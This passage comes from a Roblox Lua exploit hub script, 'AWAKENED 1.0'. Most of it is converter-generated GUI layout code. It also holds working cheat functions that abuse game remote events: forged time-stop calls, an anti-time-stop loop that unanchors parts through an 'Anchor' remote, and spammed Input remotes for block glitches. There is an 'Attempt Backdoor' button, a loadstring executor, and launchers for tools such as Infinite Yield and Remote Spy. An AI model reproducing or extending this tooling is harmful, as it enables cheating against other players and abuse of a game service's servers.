ESplashButton_4.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_7.Parent = Tab3_2
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.BorderSizePixel = 5
TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
TextLabel_7.Font = Enum.Font.Unknown
TextLabel_7.Text = "TAB 1"
TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

Tab5_2.Name = "Tab5"
Tab5_2.Parent = Tabs
Tab5_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab5_2.BackgroundTransparency = 0.500
Tab5_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab5_2.BorderSizePixel = 5
Tab5_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab5_2.Size = UDim2.new(0, 412, 0, 224)
Tab5_2.Visible = false

ESplash_5.Name = "ESplash"
ESplash_5.Parent = Tab5_2
ESplash_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash_5.BackgroundTransparency = 1.000
ESplash_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash_5.BorderSizePixel = 0
ESplash_5.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash_5.Size = UDim2.new(0, 200, 0, 50)
ESplash_5.Font = Enum.Font.ArialBold
ESplash_5.Text = "Emerald Splash"
ESplash_5.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash_5.TextScaled = true
ESplash_5.TextSize = 14.000
ESplash_5.TextWrapped = true

ESplashButton_5.Name = "ESplashButton"
ESplashButton_5.Parent = ESplash_5
ESplashButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton_5.BackgroundTransparency = 1.000
ESplashButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton_5.BorderSizePixel = 0
ESplashButton_5.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton_5.Size = UDim2.new(0, 20, 0, 32)
ESplashButton_5.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_8.Parent = Tab5_2
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.BorderSizePixel = 5
TextLabel_8.Size = UDim2.new(0, 412, 0, 22)
TextLabel_8.Font = Enum.Font.Unknown
TextLabel_8.Text = "TAB 1"
TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true

Settings.Name = "Settings"
Settings.Parent = Tabs
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1.000
Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0.187984496, 0, 0, 0)
Settings.Size = UDim2.new(0, 419, 0, 224)
Settings.Visible = false

ScrollingFrame.Parent = Settings
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0, 419, 0, 223)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1.5, 0)

ReduceLag.Name = "ReduceLag"
ReduceLag.Parent = ScrollingFrame
ReduceLag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReduceLag.BorderColor3 = Color3.fromRGB(255, 255, 255)
ReduceLag.BorderSizePixel = 2
ReduceLag.Position = UDim2.new(0.0170000009, 0, 0.0460000001, 0)
ReduceLag.Size = UDim2.new(0, 389, 0, 36)
ReduceLag.Font = Enum.Font.SourceSans
ReduceLag.Text = "Reduce Lag"
ReduceLag.TextColor3 = Color3.fromRGB(0, 0, 0)
ReduceLag.TextSize = 14.000
ReduceLag.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
ReduceLag.TextStrokeTransparency = 0.000

DeleteFire.Name = "DeleteFire"
DeleteFire.Parent = ScrollingFrame
DeleteFire.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DeleteFire.BorderColor3 = Color3.fromRGB(255, 255, 255)
DeleteFire.BorderSizePixel = 2
DeleteFire.Position = UDim2.new(0.0170000009, 0, 0.175999999, 0)
DeleteFire.Size = UDim2.new(0, 389, 0, 36)
DeleteFire.Font = Enum.Font.SourceSans
DeleteFire.Text = "Delete Fire"
DeleteFire.TextColor3 = Color3.fromRGB(0, 0, 0)
DeleteFire.TextSize = 14.000
DeleteFire.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
DeleteFire.TextStrokeTransparency = 0.000

AttemptServerside.Name = "AttemptServerside"
AttemptServerside.Parent = ScrollingFrame
AttemptServerside.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AttemptServerside.BorderColor3 = Color3.fromRGB(255, 255, 255)
AttemptServerside.BorderSizePixel = 2
AttemptServerside.Position = UDim2.new(0.0170000009, 0, 0.300000012, 0)
AttemptServerside.Size = UDim2.new(0, 389, 0, 36)
AttemptServerside.Font = Enum.Font.SourceSans
AttemptServerside.Text = "Attempt Backdoor"
AttemptServerside.TextColor3 = Color3.fromRGB(0, 0, 0)
AttemptServerside.TextSize = 14.000
AttemptServerside.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
AttemptServerside.TextStrokeTransparency = 0.000

RespawnSameSpot.Name = "RespawnSameSpot"
RespawnSameSpot.Parent = ScrollingFrame
RespawnSameSpot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RespawnSameSpot.BorderColor3 = Color3.fromRGB(255, 255, 255)
RespawnSameSpot.BorderSizePixel = 2
RespawnSameSpot.Position = UDim2.new(0.0170000009, 0, 0.425000012, 0)
RespawnSameSpot.Size = UDim2.new(0, 389, 0, 36)
RespawnSameSpot.Font = Enum.Font.SourceSans
RespawnSameSpot.Text = "Death Pos Reset"
RespawnSameSpot.TextColor3 = Color3.fromRGB(0, 0, 0)
RespawnSameSpot.TextSize = 14.000
RespawnSameSpot.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
RespawnSameSpot.TextStrokeTransparency = 0.000

Settings_2.Name = "Settings"
Settings_2.Parent = Frame
Settings_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings_2.BorderSizePixel = 0
Settings_2.Size = UDim2.new(0, 33, 0, 29)
Settings_2.Image = "http://www.roblox.com/asset/?id=14306059173"

Close.Name = "Close"
Close.Parent = Frame
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.957364321, 0, 0, 0)
Close.Size = UDim2.new(0, 22, 0, 28)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 14.000

Minimize.Name = "Minimize"
Minimize.Parent = Frame
Minimize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
Minimize.BorderSizePixel = 0
Minimize.Position = UDim2.new(0.908914745, 0, 0, 0)
Minimize.Size = UDim2.new(0, 25, 0, 29)
Minimize.Font = Enum.Font.SourceSans
Minimize.Text = "-"
Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimize.TextSize = 14.000

SHub.Name = "SHub"
SHub.Parent = Frame
SHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
SHub.BorderSizePixel = 0
SHub.Position = UDim2.new(0.0639534891, 0, 0, 0)
SHub.Size = UDim2.new(0, 25, 0, 29)
SHub.Font = Enum.Font.SourceSans
SHub.Text = "+"
SHub.TextColor3 = Color3.fromRGB(255, 255, 255)
SHub.TextSize = 14.000

Sidebar.Name = "Sidebar"
Sidebar.Parent = Frame
Sidebar.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
Sidebar.BackgroundTransparency = 0.300
Sidebar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Sidebar.BorderSizePixel = 5
Sidebar.Position = UDim2.new(-0.160852715, 0, 0.965517223, 0)
Sidebar.Size = UDim2.new(0, 77, 0, 224)
Sidebar.Visible = false

ScrollingFrame_2.Parent = Sidebar
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 77, 0, 224)
ScrollingFrame_2.CanvasSize = UDim2.new(0, 0, 5, 0)
ScrollingFrame_2.ScrollBarThickness = 10

IY.Name = "IY"
IY.Parent = ScrollingFrame_2
IY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
IY.BorderColor3 = Color3.fromRGB(0, 0, 0)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0, 0, 0.00999999978, 0)
IY.Size = UDim2.new(0, 64, 0, 29)
IY.Font = Enum.Font.SourceSans
IY.Text = "Infinite Yield"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 14.000
IY.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
IY.TextWrapped = true

Dex.Name = "Dex"
Dex.Parent = ScrollingFrame_2
Dex.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dex.BorderColor3 = Color3.fromRGB(0, 0, 0)
Dex.BorderSizePixel = 0
Dex.Position = UDim2.new(0, 0, 0.0401785709, 0)
Dex.Size = UDim2.new(0, 64, 0, 29)
Dex.Font = Enum.Font.SourceSans
Dex.Text = "Dex"
Dex.TextColor3 = Color3.fromRGB(255, 255, 255)
Dex.TextScaled = true
Dex.TextSize = 14.000
Dex.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Dex.TextWrapped = true

Rspy.Name = "Rspy"
Rspy.Parent = ScrollingFrame_2
Rspy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Rspy.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rspy.BorderSizePixel = 0
Rspy.Position = UDim2.new(0, 0, 0.0700000003, 0)
Rspy.Size = UDim2.new(0, 64, 0, 29)
Rspy.Font = Enum.Font.SourceSans
Rspy.Text = "Remote Spy"
Rspy.TextColor3 = Color3.fromRGB(255, 255, 255)
Rspy.TextScaled = true
Rspy.TextSize = 14.000
Rspy.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Rspy.TextWrapped = true

SAF.Name = "SAF"
SAF.Parent = ScrollingFrame_2
SAF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SAF.BorderColor3 = Color3.fromRGB(0, 0, 0)
SAF.BorderSizePixel = 0
SAF.Position = UDim2.new(0, 0, 0.100000001, 0)
SAF.Size = UDim2.new(0, 64, 0, 29)
SAF.Font = Enum.Font.SourceSans
SAF.Text = "SA F"
SAF.TextColor3 = Color3.fromRGB(255, 255, 255)
SAF.TextScaled = true
SAF.TextSize = 14.000
SAF.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SAF.TextWrapped = true

HBEGUI.Name = "HBEGUI"
HBEGUI.Parent = ScrollingFrame_2
HBEGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HBEGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
HBEGUI.BorderSizePixel = 0
HBEGUI.Position = UDim2.new(0, 0, 0.129999995, 0)
HBEGUI.Size = UDim2.new(0, 64, 0, 29)
HBEGUI.Font = Enum.Font.SourceSans
HBEGUI.Text = "HBE GUI"
HBEGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
HBEGUI.TextScaled = true
HBEGUI.TextSize = 14.000
HBEGUI.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
HBEGUI.TextWrapped = true

NA.Name = "NA"
NA.Parent = ScrollingFrame_2
NA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
NA.BorderColor3 = Color3.fromRGB(0, 0, 0)
NA.BorderSizePixel = 0
NA.Position = UDim2.new(0, 0, 0.159999996, 0)
NA.Size = UDim2.new(0, 64, 0, 29)
NA.Font = Enum.Font.SourceSans
NA.Text = "Nameless Admin"
NA.TextColor3 = Color3.fromRGB(255, 255, 255)
NA.TextScaled = true
NA.TextSize = 14.000
NA.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
NA.TextWrapped = true

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.112403102, 0, 0, 0)
Title.Size = UDim2.new(0, 197, 0, 28)
Title.Font = Enum.Font.SciFi
Title.Text = "AWAKENED 1.0"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000

Home_2.Name = "Home"
Home_2.Parent = Frame
Home_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home_2.BackgroundTransparency = 1.000
Home_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_2.BorderSizePixel = 0
Home_2.Position = UDim2.new(0.139534891, 0, 0, 0)
Home_2.Size = UDim2.new(0, 25, 0, 25)
Home_2.Image = "http://www.roblox.com/asset/?id=279461710"

Clock.Name = "Clock"
Clock.Parent = Frame
Clock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Clock.BackgroundTransparency = 1.000
Clock.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clock.BorderSizePixel = 0
Clock.Position = UDim2.new(0.709302306, 0, 0.0344827585, 0)
Clock.Size = UDim2.new(0, 103, 0, 22)
Clock.Font = Enum.Font.SourceSans
Clock.Text = "12:00AM"
Clock.TextColor3 = Color3.fromRGB(255, 255, 255)
Clock.TextScaled = true
Clock.TextSize = 14.000
Clock.TextWrapped = true

ProfilePicture.Name = "ProfilePicture"
ProfilePicture.Parent = Frame
ProfilePicture.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProfilePicture.BackgroundTransparency = 1.000
ProfilePicture.BorderColor3 = Color3.fromRGB(0, 0, 0)
ProfilePicture.BorderSizePixel = 0
ProfilePicture.Position = UDim2.new(0.389534891, 0, 0, 0)
ProfilePicture.Size = UDim2.new(0, 25, 0, 25)
ProfilePicture.Image = "rbxassetid://1"

FullView.Name = "FullView"
FullView.Parent = ScreenGui
FullView.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
FullView.BackgroundTransparency = 0.300
FullView.BorderColor3 = Color3.fromRGB(0, 0, 0)
FullView.BorderSizePixel = 5
FullView.Position = UDim2.new(0, 0, 0.436090231, 0)
FullView.Size = UDim2.new(0, 27, 0, 36)
FullView.Visible = false
FullView.Font = Enum.Font.SourceSans
FullView.Text = "+"
FullView.TextColor3 = Color3.fromRGB(0, 0, 0)
FullView.TextScaled = true
FullView.TextSize = 14.000
FullView.TextWrapped = true

-- Scripts:
wait()
local function SLYZ_fake_script() -- Frame.DragGUI 
	local script = Instance.new('LocalScript', Frame)

	--// Services
	local Players = game:GetService('Players')
	local UIS = game:GetService("UserInputService")
	
	--// Variables
	local UI = script.Parent
	
	local Player = Players.LocalPlayer
	local Mouse = Player:GetMouse()
	
	local Hovered = false
	local Holding = false
	local MoveCon = nil
	
	local InitialX, InitialY, UIInitialPos
	
	--// Functions
	
	local function Drag()
		if Holding == false then MoveCon:Disconnect(); return end
		local distanceMovedX = InitialX - Mouse.X
		local distanceMovedY = InitialY - Mouse.Y
	
		UI.Position = UIInitialPos - UDim2.new(0, distanceMovedX, 0, distanceMovedY)
	end
	
	--// Connections
	
	UI.MouseEnter:Connect(function()
		Hovered = true
	end)
	
	UI.MouseLeave:Connect(function()
		Hovered = false
	end)
	
	UIS.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			Holding = Hovered
			if Holding then
				InitialX, InitialY = Mouse.X, Mouse.Y
				UIInitialPos = UI.Position
	
				MoveCon = Mouse.Move:Connect(Drag)
			end
		end
	end)
	
	UIS.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			Holding = false
		end
	end)
end
coroutine.wrap(SLYZ_fake_script)()
local function XXYXH_fake_script() -- Tab1.Tab1 
	local script = Instance.new('LocalScript', Tab1)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = true
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(XXYXH_fake_script)()
local function UGQAZOC_fake_script() -- Tab2.Tab2 
	local script = Instance.new('LocalScript', Tab2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = true
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(UGQAZOC_fake_script)()
local function MRPAS_fake_script() -- Tab4.Tab4 
	local script = Instance.new('LocalScript', Tab4)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = true
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(MRPAS_fake_script)()
local function GANQ_fake_script() -- Tab3.Tab3 
	local script = Instance.new('LocalScript', Tab3)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = true
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(GANQ_fake_script)()
local function EQVTX_fake_script() -- Tab6.Tab6 
	local script = Instance.new('LocalScript', Tab6)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = true
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(EQVTX_fake_script)()
local function GOYZJKW_fake_script() -- Tab5.Tab5 
	local script = Instance.new('LocalScript', Tab5)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = true
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(GOYZJKW_fake_script)()
local function JHIWGD_fake_script() -- Executor.Executor 
	local script = Instance.new('LocalScript', Executor)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Executor.Visible = true
	end)
end
coroutine.wrap(JHIWGD_fake_script)()
local function GQTH_fake_script() -- Tab7.Tab7 
	local script = Instance.new('LocalScript', Tab7)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = true
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(GQTH_fake_script)()
local function MYBAUCD_fake_script() -- _15SecondTSButton.ButtonManager 
	local script = Instance.new('LocalScript', _15SecondTSButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("15 SECOND TS ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
				if on == true and not gameProcessed then
					if input.KeyCode == Enum.KeyCode.LeftControl then
						local args = {
							[1] = 15,
							[2] = "diego"
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Timestop"):FireServer(unpack(args))
					end
				end
			end)
			
		elseif on == true then
			on = false
			off = true
			print("15 SECOND TS OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(MYBAUCD_fake_script)()
local function SDORLQ_fake_script() -- AntiTSButton.ButtonManager 
	local script = Instance.new('LocalScript', AntiTSButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		
		if off == true then
			on = true
			off = false
			print("ANTI TS ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local Players = game:GetService("Players")
	
			local timeStopStartedEvent = Instance.new("BindableEvent")
			local timeStopEndedEvent = Instance.new("BindableEvent")
	
			local anchorRemote = ReplicatedStorage:WaitForChild("Anchor")
	
			local function getBaseParts(root)
				local parts = {}
				local function scan(obj)
					for _, child in ipairs(obj:GetChildren()) do
						if child:IsA("BasePart") then
							table.insert(parts, child)
						end
						if #child:GetChildren() > 0 then
							scan(child)
						end
					end
				end
				if root and root:IsDescendantOf(game) then
					scan(root)
				end
				return parts
			end
	
			local function setAnchorState(parts, state)
				for _, part in ipairs(parts) do
					if part and part:IsDescendantOf(game) then
						pcall(function()
							anchorRemote:FireServer(part, state)
						end)
					end
				end
			end
	
			local running = false
			local antiTsConnection
	
			local function startAntiTs()
				if running then return end
				running = true
	
				antiTsConnection = task.spawn(function()
					while running do
						local player = Players.LocalPlayer
						if not player then task.wait(0.5) continue end
	
						local character = player.Character or player.CharacterAdded:Wait()
						if character then
							local charParts = getBaseParts(character)
							setAnchorState(charParts, false)
	
							local stand = character:FindFirstChild("Stand")
							if stand then
								local standParts = getBaseParts(stand)
								setAnchorState(standParts, false)
							end
						end
	
						task.wait(0.5)
					end
				end)
			end
	
			local function stopAntiTs()
				running = false
			end
	
			Players.LocalPlayer.CharacterAdded:Connect(function()
				if running then return end
				startAntiTs()
			end)
			while on == true do
				wait()
			timeStopStartedEvent.Event:Connect(startAntiTs)
			timeStopEndedEvent.Event:Connect(stopAntiTs)
			end
			
			task.delay(5, function()
				timeStopStartedEvent:Fire()
			end)
	
			task.delay(15, function()
				timeStopEndedEvent:Fire()
			end)
			
			
			
		elseif on == true then
			on = false
			off = true
			print("ANTI TS OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(SDORLQ_fake_script)()
local function ATGJWIG_fake_script() -- BlockGlitch_2.ButtonManager 
	local script = Instance.new('LocalScript', BlockGlitch_2)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		
		if off == true then
			on = true
			off = false
			print("BLOCK BUG ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			while on == true do
				local args = {
					[1] = "Alternate",
					[2] = "Block",
					[3] = true
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
				wait(0.1)
			end
			
		elseif on == true then
			on = false
			off = true
				local args = {
					[1] = "Alternate",
					[2] = "Block",
					[3] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			print("BLOCK BUG OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(ATGJWIG_fake_script)()
local function ALIPUOR_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	script.Parent.Activated:Connect(function()
		loadstring(script.Parent.Parent.TextBox.Text)
	end)
end
coroutine.wrap(ALIPUOR_fake_script)()
local function FQQWMC_fake_script() -- Clear.LocalScript 
	local script = Instance.new('LocalScript', Clear)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.TextBox.Text = "--WRITE YOUR SCRIPT"
	end)
end
coroutine.wrap(FQQWMC_fake_script)()
local function VDGGQ_fake_script() -- Welcome.LocalScript 
	local script = Instance.new('LocalScript', Welcome)

	local lp = game.Players.LocalPlayer
	script.Parent.Text = "Welcome, "..lp.Name.."!"
end
coroutine.wrap(VDGGQ_fake_script)()
local function LBOOVMY_fake_script() -- Quote.LocalScript 
	local script = Instance.new('LocalScript', Quote)

	local numbers = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
	local randomIndex = math.random(1, #numbers)
	local chosenNumber = numbers[randomIndex]
	
	if chosenNumber == 1 then
		script.Parent.Text = "Down to cause chaos?"
	elseif chosenNumber == 2 then
		script.Parent.Text = "Let's get this party started!"
	elseif chosenNumber == 3 then
		script.Parent.Text = "What's it gonna be today, "..game.Players.LocalPlayer.Name.."?"
	elseif chosenNumber == 4 then
		script.Parent.Text = "You are the storm that is approaching!"
	elseif chosenNumber == 5 then
		script.Parent.Text = "Well, isn't this quite the moment?"
	elseif chosenNumber == 6 then
		script.Parent.Text = "Turn this place into a slaughterfest!"
	elseif chosenNumber == 7 then
		script.Parent.Text = "How's it going?"
	elseif chosenNumber == 8 then
		script.Parent.Text = "Let's crush this!"
	elseif chosenNumber == 9 then
		script.Parent.Text = "We got this."
	elseif chosenNumber == 10 then
		script.Parent.Text = "Ready to kill?"
	end
end
coroutine.wrap(LBOOVMY_fake_script)()
local function UZHM_fake_script() -- STWRTZButton.ButtonManager 
	local script = Instance.new('LocalScript', STWRTZButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("STWRTZ ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
					while on == true do
						local args = {
							[1] = "Alternate",
							[2] = "STWRTZ",
							[3] = true
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
						wait(1)
					end
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
		elseif on == true then
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
						local args = {
							[1] = "Alternate",
							[2] = "STWRTZ",
							[3] = false
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
			on = false
			off = true
			print("STWRTZ OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(UZHM_fake_script)()
local function QBDY_fake_script() -- STWRTZButton_2.ButtonManager 
	local script = Instance.new('LocalScript', STWRTZButton_2)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("GERRTZ ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
					while on == true do
						local args = {
							[1] = "Alternate",
							[2] = "RTZ",
							[3] = true
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
						wait(1)
					end
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
		elseif on == true then
			
			local player = game.Players.LocalPlayer
				coroutine.wrap(function()
						local args = {
							[1] = "Alternate",
							[2] = "RTZ",
							[3] = false
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			end)()
			on = false
			off = true
			print("GERRTZ OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(QBDY_fake_script)()
local function ZFDFY_fake_script() -- D4CClonesButton.ButtonManager 
	local script = Instance.new('LocalScript', D4CClonesButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("D4CCLONES ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local UserInputService = game:GetService("UserInputService")
